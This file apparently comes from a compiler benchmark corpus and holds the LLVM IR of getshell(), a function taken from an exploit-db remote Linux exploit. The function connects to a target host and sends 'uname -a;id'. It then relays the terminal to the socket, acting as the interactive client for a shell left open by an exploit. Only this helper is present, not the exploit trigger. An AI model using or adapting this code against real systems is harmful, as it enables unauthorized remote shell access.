; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21784.c_getshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21784.c_getshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [52 x i8] c"[*] checking to see if the exploit was successful.\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"getshell(): socket() failed.\00", align 1
@.str.2 = private unnamed_addr constant [30 x i8] c"getshell(): couldn't resolve.\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [35 x i8] c"[*] attempting to connect: %s:%d.\0A\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"[!] connection failed: %s:%d.\0A\00", align 1
@.str.5 = private unnamed_addr constant [37 x i8] c"[*] successfully connected: %s:%d.\0A\0A\00", align 1
@SIGINT = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [13 x i8] c"uname -a;id\0A\00", align 1
@.str.7 = private unnamed_addr constant [29 x i8] c"getshell(): select() failed.\00", align 1
@.str.8 = private unnamed_addr constant [27 x i8] c"getshell(): read() failed.\00", align 1
@.str.9 = private unnamed_addr constant [28 x i8] c"getshell(): write() failed.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getshell(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4097 x i8], align 16
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str, i64 0, i64 0))
  %12 = load i32, i32* @AF_INET, align 4
  %13 = load i32, i32* @SOCK_STREAM, align 4
  %14 = load i32, i32* @IPPROTO_TCP, align 4
  %15 = call i32 @socket(i32 %12, i32 %13, i32 %14)
  store i32 %15, i32* %5, align 4
  %16 = icmp eq i32 %15, -1
  br i1 %16, label %17, label %19

17:                                               ; preds = %2
  %18 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %19

19:                                               ; preds = %17, %2
  %20 = load i32, i32* @AF_INET, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %20, i32* %21, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = call i32 @inet_addr(i8* %22)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 0
  store i32 %23, i32* %25, align 4
  %26 = icmp ne i32 %23, 0
  br i1 %26, label %27, label %41

27:                                               ; preds = %19
  %28 = load i8*, i8** %3, align 8
  %29 = call %struct.hostent* @gethostbyname(i8* %28)
  store %struct.hostent* %29, %struct.hostent** %9, align 8
  %30 = icmp ne %struct.hostent* %29, null
  br i1 %30, label %33, label %31

31:                                               ; preds = %27
  %32 = call i32 @printe(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %33

33:                                               ; preds = %31, %27
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  %35 = bitcast %struct.TYPE_2__* %34 to i8*
  %36 = load %struct.hostent*, %struct.hostent** %9, align 8
  %37 = getelementptr inbounds %struct.hostent, %struct.hostent* %36, i32 0, i32 0
  %38 = load i64, i64* %37, align 8
  %39 = inttoptr i64 %38 to i8*
  %40 = call i32 @memcpy(i8* %35, i8* %39, i32 4)
  br label %41

41:                                               ; preds = %33, %19
  %42 = load i16, i16* %4, align 2
  %43 = call i32 @htons(i16 zeroext %42)
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %43, i32* %44, align 4
  %45 = load i32, i32* @SIGALRM, align 4
  %46 = load i32, i32* @sig_alarm, align 4
  %47 = call i32 @signal(i32 %45, i32 %46)
  %48 = load i32, i32* @TIMEOUT, align 4
  %49 = call i32 @alarm(i32 %48)
  %50 = load i8*, i8** %3, align 8
  %51 = load i16, i16* %4, align 2
  %52 = zext i16 %51 to i32
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0), i8* %50, i32 %52)
  %54 = load i32, i32* %5, align 4
  %55 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %56 = call i64 @connect(i32 %54, %struct.sockaddr* %55, i32 12)
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %63

58:                                               ; preds = %41
  %59 = load i8*, i8** %3, align 8
  %60 = load i16, i16* %4, align 2
  %61 = zext i16 %60 to i32
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0), i8* %59, i32 %61)
  ret void

63:                                               ; preds = %41
  %64 = call i32 @alarm(i32 0)
  %65 = load i8*, i8** %3, align 8
  %66 = load i16, i16* %4, align 2
  %67 = zext i16 %66 to i32
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0), i8* %65, i32 %67)
  %69 = load i32, i32* @SIGINT, align 4
  %70 = load i32, i32* @SIG_IGN, align 4
  %71 = call i32 @signal(i32 %69, i32 %70)
  %72 = load i32, i32* %5, align 4
  %73 = call i32 @write(i32 %72, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0), i32 13)
  br label %74

74:                                               ; preds = %63, %119
  %75 = call i32 @FD_ZERO(i32* %7)
  %76 = call i32 @FD_SET(i32 0, i32* %7)
  %77 = load i32, i32* %5, align 4
  %78 = call i32 @FD_SET(i32 %77, i32* %7)
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, i32* %7, i32 0, i32 0, i32 0)
  %82 = icmp slt i32 %81, 1
  br i1 %82, label %83, label %85

83:                                               ; preds = %74
  %84 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0), i32 1)
  br label %85

85:                                               ; preds = %83, %74
  %86 = call i64 @FD_ISSET(i32 0, i32* %7)
  %87 = icmp ne i64 %86, 0
  br i1 %87, label %88, label %104

88:                                               ; preds = %85
  %89 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %90 = call i32 @read(i32 0, i8* %89, i32 4096)
  store i32 %90, i32* %6, align 4
  %91 = icmp slt i32 %90, 1
  br i1 %91, label %92, label %94

92:                                               ; preds = %88
  %93 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0), i32 1)
  br label %94

94:                                               ; preds = %92, %88
  %95 = load i32, i32* %5, align 4
  %96 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %97 = load i32, i32* %6, align 4
  %98 = call i32 @write(i32 %95, i8* %96, i32 %97)
  %99 = load i32, i32* %6, align 4
  %100 = icmp ne i32 %98, %99
  br i1 %100, label %101, label %103

101:                                              ; preds = %94
  %102 = call i32 @printe(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.9, i64 0, i64 0), i32 1)
  br label %103

103:                                              ; preds = %101, %94
  br label %104

104:                                              ; preds = %103, %85
  %105 = load i32, i32* %5, align 4
  %106 = call i64 @FD_ISSET(i32 %105, i32* %7)
  %107 = icmp ne i64 %106, 0
  br i1 %107, label %108, label %119

108:                                              ; preds = %104
  %109 = load i32, i32* %5, align 4
  %110 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %111 = call i32 @read(i32 %109, i8* %110, i32 4096)
  store i32 %111, i32* %6, align 4
  %112 = icmp slt i32 %111, 1
  br i1 %112, label %113, label %115

113:                                              ; preds = %108
  %114 = call i32 @exit(i32 0) #3
  unreachable

115:                                              ; preds = %108
  %116 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %117 = load i32, i32* %6, align 4
  %118 = call i32 @write(i32 1, i8* %116, i32 %117)
  br label %119

119:                                              ; preds = %115, %104
  br label %74
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32, i32, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
